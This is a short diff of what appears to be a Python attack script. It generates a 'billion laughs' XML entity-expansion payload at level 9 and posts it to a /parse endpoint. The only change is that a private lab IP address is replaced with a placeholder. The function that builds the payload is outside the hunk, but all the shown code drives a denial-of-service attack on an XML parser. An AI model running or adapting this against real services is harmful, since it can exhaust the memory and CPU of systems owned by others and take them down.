@@ -10,5 +10,5 @@ def bomb(n):
 LEVEL = 9
 payload = bomb(LEVEL)
 print(f"payload is {len(payload)} bytes, expands to {10**LEVEL:,} 'lol's")
-r = requests.post("http://192.168.198.134:8080/parse", data=payload.encode(), timeout=15)
+r = requests.post("http://x.x.x.x:8080/parse", data=payload.encode(), timeout=15)
 print(r.text)
